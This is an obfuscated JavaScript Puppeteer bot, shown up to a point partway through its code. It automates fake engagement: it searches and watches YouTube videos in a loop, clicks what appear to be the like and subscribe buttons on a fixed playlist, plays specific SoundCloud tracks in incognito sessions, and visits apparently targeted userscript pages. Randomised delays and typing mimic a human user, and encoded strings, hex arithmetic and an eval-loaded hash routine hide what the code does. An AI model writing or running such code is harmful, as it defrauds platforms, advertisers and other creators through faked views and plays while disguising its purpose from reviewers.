const W = c,
  V = b,
  T = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x2478 * -0x1 + 0x3 * 0x543 + -0x3440))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x2f7 * 0xd + -0x87d * -0x4 + -0x115 * 0x43), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x3c5c + -0xa35b + 0x154e7 + (0x1067 * -0x2 + 0x1d * 0x222 + 0x1d8c) * random()) : await standardWaitForNetIdle(f), await wait(0x29 * -0x81 + -0x1 * 0x765 + 0x2f96 + (-0x3d94 + 0x4 * -0x606 + 0x7cbc) * random()), 0x1 * 0x24fb + -0x25e3 + 0xe9;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x35f + -0x1 * -0x18b9 + -0x4 * 0x224), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x66 * -0x21 + 0x76 * 0x3b + -0x2857;
}
async function randomWait() {
  return await wait(0x1229 * 0x1 + -0x1 * -0x12cd + -0x116e + (-0x192a + -0x1f8a * 0x1 + 0x52 * 0xee) * random()), 0x215f + 0x1a * 0x3c + -0x2 * 0x13bb;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2063 * 0x1 + -0x1 * 0x274 + -0x1def, 0x2172 * 0x1 + -0x525 + -0x1c46), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1d * -0x7c6 + 0x944 * -0x25 + 0x322a2) * getRandomInt(-0x2 * -0xfbb + -0xdcc + -0x11a8, 0x132b + 0xacf * -0x3 + 0xd47), h)), 0x29 * -0x86 + -0x1 * 0x85f + 0x26 * 0xc9;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x268e + 0x12d6 + -0x13b8 * -0x1);
    let h = e[f];
    if (c['JfJKir'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1a5 * -0x8 + 0x2637 + 0x1 * -0x335f, r, s, t = -0xa81 + -0xcd8 * 0x2 + 0x55 * 0x6d; s = m['charAt'](t++); ~s && (r = q % (0xa * 0x3d0 + -0x268d + 0x71 * 0x1) ? r * (-0x9a * -0xa + -0x5f3 * -0x5 + -0x2383) + s : s, q++ % (-0x1b3a + -0x1dfb + 0x3939)) ? o += String['fromCharCode'](0xe * 0x179 + -0x6c * -0x3d + -0x2d5b & r >> (-(0x1 * -0x765 + 0x13b7 + -0xc50) * q & -0x1eca + 0x3 * -0x404 + 0x2adc)) : 0x1 * 0x24fb + -0x25e3 + 0xe8) {
          s = n['indexOf'](s);
        }
        for (let u = 0x35f + -0x1 * -0x18b9 + -0x8 * 0x383, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x66 * -0x21 + 0x76 * 0x3b + -0x2848))['slice'](-(0x1229 * 0x1 + -0x1 * -0x12cd + -0x24f4));
        }
        return decodeURIComponent(p);
      };
      c['jqYzrV'] = i, b = arguments, c['JfJKir'] = !![];
    }
    const j = e[-0x192a + -0x1f8a * 0x1 + 0x4c * 0xbf],
      k = f + j,
      l = b[k];
    return !l ? (h = c['jqYzrV'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x4dc + 0x15d * 0x17 + -0x2437;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x11f3 + -0x3 * -0x220 + 0x1 * -0x1852]['split']('\x20');
    for (let k = 0x25 * 0x28 + -0x1a * -0x4f + 0x3 * -0x49a; k < i['length']; k += 0x1b2 + 0x63 + -0x213 * 0x1)
      j += i[k] * h[i[k + (-0x4e1 * 0x5 + 0x183a + 0x16 * 0x2)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x67 * 0x58 + -0x21e6 + -0x17c)['map'](l => Array['from'](l['children']))['flat'](0x14cd + 0x10 * -0x20e + -0xc14 * -0x1)['map'](l => l['childNodes'][-0xba3 + -0x88 * 0x2 + -0x6 * -0x21e]['childNodes'][0x15 * -0x2a + -0x1 * -0xec2 + -0xb50]['childNodes'][0x5d1 + 0x3f * 0x96 + -0x1 * 0x2aba]['childNodes'][0x1a6e + -0x1 * -0x244c + -0x3eba]['childNodes'][-0x2 * 0x7f1 + 0x1 * 0x1b58 + -0xb75]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2602 + -0x459 * 0x3 + 0x36f5, -0xec8 + -0x7b9 * 0x3 + 0x397b)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x10f4 * 0x6 + 0x1e43 + -0x4963);
  const h = await getMaxTime(f),
    i = Math['min']((-0xdefd * 0x2 + 0xa4 * -0x56 + -0x16fb9 * -0x2) * getRandomInt(-0x1 * -0x3aa + 0x32b * -0x1 + -0x7d, 0x244d * -0x1 + 0xb2e + 0x4 * 0x649), h);
  return await wait(i), -0xb57 + -0x1d53 + 0x28ab;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x24be + 0x40 * 0x2d + -0x2ffe]['children'][-0x1 * 0x26ae + 0x1931 * 0x1 + -0xd7d * -0x1]['children'][-0x17f4 + -0x8bf * 0x3 + -0x10bb * -0x3]['children'][0x7d * -0x1f + 0x1d8c * 0x1 + -0xe69]['children'][-0x1929 + 0x1b13 + -0x5 * 0x62]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x3 * 0x4d8 + -0x1e5 * 0x9 + 0x1f96;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x2b2 + 0x47 * -0x77 + 0x2417 + (-0x277 * -0xa + 0x2a * -0x5e + -0x908) * random()
  }), await wait(-0x1599 * -0x1 + 0x35f * 0x4 + 0x2121 * -0x1 + (-0xf * -0x1b1 + 0x75a * -0x4 + -0x535 * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x6dd * -0x3 + 0x1e8d + -0x3322]['childNodes'][0x1cd4 + -0x1102 + -0xbd1]['childNodes'][0x5 * 0x6cb + -0xb * -0xc5 + -0x2a6d]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x88c * -0x1 + -0xe9c + 0x172d]['childNodes'][0xdd4 + -0x1c22 + 0xe4e]['childNodes'][0x527 + 0x1db0 + -0x1 * 0x22d5]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x22f4 * -0x1 + -0x7c0 + 0x1 * -0x1b33),
          r = 0xafd + 0x1d * -0x112 + 0x140d;
        for (let u = 0x175 * -0x5 + 0x1342 + -0x265 * 0x5; u < q['length']; u += -0xc1 + 0xb2c * -0x3 + 0x2247)
          r += q[u] * k[q[u + (0x433 * -0x9 + 0x26f + -0x1 * -0x235d)]];
        return r;
      }(n);
  });
  await wait((0x1 * -0x916 + -0x2ef * 0x7 + 0x5837) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x6765 + -0x56fa + -0x1 * -0xd9f5) * getRandomInt(-0x261b * 0x1 + 0xd4 * -0xb + 0x2f38, -0x1f48 + 0x1444 + 0xb0e), h + (0x100f + 0x1 * 0x176e + 0x189 * -0xd));
  return await wait(i), 0x16a1 + 0x32e + -0x19ce * 0x1;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1bf + 0x15fb + 0x1c * -0xb9), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    const R = c;
    log('executed\x20c' + 'leanup\x20int' + R(0x11) + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x26fb * 0x1 + 0x1 * 0xaff + 0x27b4 + (-0x1 * -0x18b1 + -0x353 + 0x5 * -0x37e) * Math['random']());
    });
  }, 0x718 + -0x20c3 * -0x1 + -0x1 * 0xc83);
  await wait(-0x17 * -0x5fdb + -0x3fbd3 + 0x67d * -0x2);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1 * -0xb0cf + 0x177d4 + 0x50d * 0x7) * getRandomInt(-0x2 * -0xdaf + 0x1672 + 0x31cc * -0x1, 0x17 * 0xd3 + 0x215e + -0x343a)), clearInterval(h), -0xd11 + -0x14d + -0xd * -0x11b;
}

function a() {
  const bn = [
    'https://me',
    'W6/cUmkYW6K',
    'ACk0r2FdSMNdNgZdN8kU',
    'W7ZcICoSsSkrtmoshSokhq',
    'CMCVzw4VC2nYAq',
    'easyfork.o',
    'Bg9Ylw5HBwvZlq',
    'yqG2WQ3dVmkdmCoiW7Wf',
    'mZCUmZyGkeTiva',
    'ts\x20日本語字幕,b',
    'omkBW7tcLZddRCkVW7ddJSkb',
    'tSoEW7xcKGVdJKT3WRlcGa',
    'FCkuccy',
    'W7FcTmkUW5vlW4qUWQZdJCkb',
    'zSocl8kjWOxdOmkwhrBcLW',
    'lwfUDgKTyw50Aq',
    'ts,suga\x20bt',
    'zxj2ywWSignOzq',
    'AuEEjQ8x9o',
    'W6pcImoZaCoExSkraSoura',
    'w.youtube.',
    'zxnnB2rL',
    'WPVdOSoFiSkrjNaIoSkB',
    'r\x20beast,mr',
    'omo9Agqm',
    'wSoTaSk8WP7cVmkIktVcOq',
    '-fast-read',
    'rg/en/scri',
    'dwqkdmnBZc',
    'o4tLCshmlb',
    'h8k9WONdSs7dHeTTWQVcIW',
    'kmkFW6qwW6JcVY5oWPVcGG',
    's\x20news,bts',
    'sJn5z2veru1UtW',
    'Ahr0Chm6lY93DW'
  ];
  a = function() {
    return bn;
  };
  return a();
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x33b * 0x9 + 0x1 * -0x1fcd + 0x3ce0;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1f5 * 0x7 + -0x1 * -0xc35 + 0x17f;
    await randomWait();
  }
  return 0x110 * -0x1a + -0x1 * 0x26ef + 0x4290;
}

function fetchRandomSC() {
  return Math['random']() <= -0x6 * 0xda + -0x101f * 0x2 + 0x255a + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xb29 + -0x1202 * -0x2 + -0x18db + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x2462 * -0x1 + 0xe35 + -0x3 * 0x10dd + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x2 * 0x76d + -0x1120 + 0x1ffa * 0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xe17b * 0x1 + 0x29aa * 0x2 + -0x8507 + getRandomInt(-0x1143 + -0x3b98 * -0x1 + 0x1043, -0x1d63 * 0x1 + 0x2 * 0x6efc + -0x4b65));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1cf2 + -0xb57 * -0x1 + 0x1 * -0x2848), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1173 + 0x20 * -0x112 + 0x33b3 * 0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1163 + -0x2 * 0xb65 + 0x282d, -0x1 * 0x1fcb + -0x3c1 * 0x5 + -0x59 * -0x92)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * 0x30a + -0x17 * 0x66 + 0xdf0 + floor((-0x1462 * -0x1 + -0xef * 0x10 + 0x2 * -0xc5) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x95452da * -0x4 + 0xb6c809c4 + -0x5c19552c),
          -0xdaeb53 + -0x713 * 0x1966 + 0x93d0d * 0x39,
          0x2f72 * 0x2 + -0xdeac * 0x1 + 0xffc8,
          0x1d57 + -0x991 + -0x1346
        ], y = [
          -0x1 * 0x701 + -0x499 * 0x7 + 0x18 * 0x1a3,
          0xa1 * -0x37 + -0x21a1 + -0x73 * -0x98,
          0x2113 + 0xf2 * -0x2 + -0x1f27,
          0x1d4a * 0x1 + -0x1a6 * -0x1 + -0x1ef0
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x15a * -0x2 + -0x911 * -0x1 + -0xbc4)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x33 * -0x4d + -0xb17 + -0x22 * -0xc7; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x175b + -0x945 * 0x1 + -0xe16) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x233 * -0x1 + 0x6 + 0x22d] = A[0x1078 + 0x222d + -0x3295] = A[0x2f9 + 0xf3f + -0x1237] = A[0x9 * 0x1 + 0x1571 + -0x1578] = A[0xd * -0x2ea + -0x2b6 * 0x1 + 0x289b] = A[-0x1109 * -0x1 + -0x2 * -0x216 + 0x1f * -0xaf] = A[-0x1b37 + -0x55c + 0x2098] = A[0x1e22 + -0xb82 + -0x129a] = A[-0x9b9 + 0x7cd * 0x1 + 0x1f3] = A[-0x1 * -0xcac + 0x1ceb + -0x298f] = A[0xb5 * -0xf + -0x1d * 0x52 + 0x13ee] = A[0x19 * 0x3b + 0x11fc + 0x3 * -0x7e7] = A[0x1276 + 0x6e9 + -0x1954] = A[-0x6eb * 0x4 + -0x1dfb + 0x39b3 * 0x1] = A[-0xb92 + -0xbdb + 0x177a] = A[-0x3ea * -0x1 + -0x887 * -0x2 + -0x14ea] = A[0x1f37 * 0x1 + -0x748 * 0x1 + 0x5f8 * -0x4] = 0x30c + -0x7 * 0x3c7 + 0x1765 * 0x1, this['blocks'] = A) : this['blocks'] = [
                -0x429 * -0x4 + 0x8ef * 0x1 + -0x1993 * 0x1,
                -0x85 * 0x3b + -0x25 * -0xab + -0x130 * -0x5,
                0xe85 + -0x38 * 0xa7 + -0x7 * -0x325,
                -0x7 * 0x3e5 + -0x11 * -0x18d + 0xe6,
                -0x12a1 + -0x1822 + 0x2ac3,
                -0xc1e + -0x1e59 + 0x1 * 0x2a77,
                -0x2 * -0x5ea + -0x1 * -0x20a6 + -0x163d * 0x2,
                0xdc1 + -0x4 * 0x4b2 + 0x507,
                -0xa72 + 0x12df + -0x86d,
                0x140 + -0x1c91 * -0x1 + -0x1dd1,
                0x47 * -0x17 + -0x18bc + 0xb1 * 0x2d,
                -0x1086 + 0x1 * 0x13ac + -0x326,
                -0x107e + -0x14aa + 0x2528,
                0x1adb * 0x1 + 0x8b5 * 0x3 + -0x34fa,
                -0x1ce6 + 0x11 * 0x241 + -0x96b,
                0x1a33 * -0x1 + 0x1 * 0x1b25 + -0xf2,
                -0x11c3 * -0x1 + 0x2558 + 0x1 * -0x371b
              ], this['h0'] = -0x3fc188f6 + -0xdf3f81 * -0x5d + 0x55ec9a1a, this['h1'] = 0x13f51c19 + -0x3883ff2b + -0x5 * -0x3745b61f, this['h2'] = 0x11d53779a + 0x1 * 0xf1547661 + -0x175ed10fd, this['h3'] = 0x19c2d9 * -0x11 + -0x1b25e81f + -0xf9 * -0x2e526e, this['h4'] = 0xd33732e6 + 0x15e8 * -0xaed41 + 0x3027 * 0x4a6be, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1406 + -0x28a * -0xd + 0x33f * -0x4, this['finalized'] = this['hashed'] = -0x12 * -0x139 + -0x2 * 0x332 + -0xf9e, this['first'] = 0x5a * 0x38 + 0x12c1 * 0x2 + -0x3931;
            }
            ['update'](J) {
              const S = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x2106 + 0x1a5e + -0x3b64, O = J['length'] || -0x1 * 0xe3e + 0xba5 + 0x299, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x7c9 * -0x1 + 0x583 * 0x1 + -0x246 * -0x1, P[-0x3b * 0x11 + 0x44f * 0x5 + -0x11a0] = this[S(0x18, 'D$kK')], P[0x59 * -0x57 + 0x194c + 0x503] = P[-0xb * -0x2c5 + 0x42a + -0x22a0] = P[-0x1a7 * 0x17 + 0x224 * 0xe + -0x80b * -0x1] = P[-0x36c + -0x4cb + 0x83a] = P[0x7e1 * -0x2 + -0x82e * 0x2 + -0x1011 * -0x2] = P[-0x1e95 + -0x1d * 0x3d + 0x2583] = P[-0x1 * 0x1d62 + 0x1 * -0x196b + -0x36d3 * -0x1] = P[-0x1 * -0x2349 + 0x124f + -0x3591] = P[0x1 * -0x7b1 + -0x5ab * -0x1 + 0x20e] = P[-0x15d * 0x1c + -0x9b5 + 0x2fea] = P[-0x1230 + 0x239e + -0x1164] = P[-0x2470 + 0x180 + -0x22fb * -0x1] = P[0x49d * 0x5 + -0x4 * 0x14c + 0x53 * -0x37] = P[-0x3 * -0xa69 + 0xb5e + -0x1546 * 0x2] = P[0x199c + -0x665 * 0x6 + -0x668 * -0x2] = P[-0x3fb * 0x1 + -0x1 * 0x1129 + 0xc9 * 0x1b] = -0x3 * -0x921 + -0x227d * 0x1 + 0x12f * 0x6), K) {
                    for (N = this['start']; M < O && N < -0x1f6 + 0x1a * -0x92 + 0x110a; ++M)
                      P[N >> -0x1eec * -0x1 + -0x1 * 0x893 + -0x1657] |= J[M] << y[-0x27 * 0xd9 + 0x94b + 0x17c7 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1e7a + -0xa20 + -0xa6 * 0x1f; ++M)
                      (L = J['charCodeAt'](M)) < 0x6c3 * -0x5 + 0x3f1 * -0x7 + 0x3de6 ? P[N >> -0x1695 + 0x3bc + 0x12db] |= L << y[0x18f4 + -0x211f + 0x82e * 0x1 & N++] : L < -0xe95 + -0xe * 0x1d0 + 0x2ff5 ? (P[N >> 0xd79 + 0x4c + -0xdc3] |= (0x1 * -0x213a + -0x8a * 0x48 + 0x48ca | L >> 0x33 * -0x88 + -0x2c5 * -0xb + 0x359 * -0x1) << y[-0x3b9 * -0x8 + 0xbb * -0x2 + -0x1c4f & N++], P[N >> 0x1e * 0x124 + 0x1da3 * 0x1 + -0x3fd9] |= (-0x716 * -0x3 + -0x2353 + 0xe91 | 0x2682 + -0x1d4f * -0x1 + -0x4392 & L) << y[-0x1 * 0xc53 + -0xe40 + 0x52 * 0x53 & N++]) : L < 0x38a1 + -0x7 * -0xd03 + -0x444a * -0x1 || L >= -0x49ad + -0xa61c + 0x1cfc9 ? (P[N >> 0x8d6 * -0x2 + 0x84 * 0x24 + -0xe2] |= (-0xae5 + 0x185 * -0x3 + 0x1054 | L >> -0x466 + 0x1d * 0xca + -0x1270) << y[0x15e0 + -0x1 * -0xdda + -0x23b7 & N++], P[N >> 0x4 * 0x649 + 0x1 * -0x15b5 + -0x36d] |= (0xd95 + 0x4fd + 0x909 * -0x2 | L >> 0x11f0 + 0x1319 + -0x1 * 0x2503 & 0x1 * -0x245d + -0x1 * 0x24af + 0x494b) << y[-0x1 * -0x2 + -0x1de4 * 0x1 + 0x3 * 0x9f7 & N++], P[N >> 0x145f + 0x942 + -0x1d9f] |= (0x1 * -0xfa + -0x1 * 0xaf3 + 0xc6d | 0x1 * -0x1d69 + -0x1cfa + 0x3aa2 & L) << y[-0x232 * -0x6 + -0x103f + 0x316 & N++]) : (L = -0xef23 + 0x7d56 + 0x171cd + ((-0x1fc7 + -0xb2 * 0x30 + 0x4526 & L) << -0x1a9e + -0x1589 + 0x3031 | -0x1 * 0x1dd7 + 0xf65 + 0x1271 & J['charCodeAt'](++M)), P[N >> 0x1 * 0x1c9b + 0x43 * 0x94 + -0x4355 * 0x1] |= (0x56 * 0x59 + 0x16b2 + -0x33a8 | L >> -0xe84 * 0x1 + -0x1b92 + 0x2a28) << y[-0x53 * -0x29 + 0x1b29 + 0x11 * -0x261 & N++], P[N >> -0x1bfa + -0x3 * -0x5b9 + -0x27 * -0x47] |= (0xbc9 + 0xb * 0x375 + -0x3150 | L >> 0x3 * -0x1b6 + -0x1f72 + 0x24a0 & -0x24f * -0x10 + -0x1 * -0x24a0 + -0x1 * 0x4951) << y[0x45d * 0x3 + 0x2 * 0x681 + -0x1a16 & N++], P[N >> -0x4 * 0x98b + 0x5eb + 0x2043] |= (0xd28 + 0x3e5 * -0x3 + 0x3 * -0x53 | L >> 0x42 * -0x4 + -0x19c0 + -0xd67 * -0x2 & -0xd * 0x1a5 + 0x67 * -0x3a + 0x2cf6) << y[0x1d7 + 0xa97 * 0x3 + 0x3d * -0x8d & N++], P[N >> -0x17 * -0x161 + 0x1 * 0x1f0b + -0xfb0 * 0x4] |= (-0x1 * 0x1345 + -0x1e71 + 0x2 * 0x191b | -0x1aa4 + 0x7bd + 0x1326 & L) << y[-0x79 * -0x50 + 0x1 * 0x1d9f + -0x436c & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1 * -0xda3 + -0xdf * -0x7 + 0x9be * -0x2 ? (this['block'] = P[0x1745 + 0x1af2 + 0x1 * -0x3227], this['start'] = N - (-0xbdd + -0x1 * 0xc11 + 0x182e), this['hash'](), this['hashed'] = -0x5ac + 0x841 * 0x1 + 0x14 * -0x21) : this['start'] = N;
                }
                return this['bytes'] > 0x18b859faf + 0x5 * -0x47fb5013 + 0xbeb9b * 0x127d && (this['hBytes'] += this['bytes'] / (-0x138f5216c + 0xa * 0x1aac5a74 + 0x12e3998e4) << 0x1f98 + -0x181d + -0x5 * 0x17f, this['bytes'] = this['bytes'] % (0xd6868ebc + -0xacf3a730 + -0x7 * -0x1ea1deec)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1 * -0x22e1 + -0x269a + 0x24be * 0x2;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
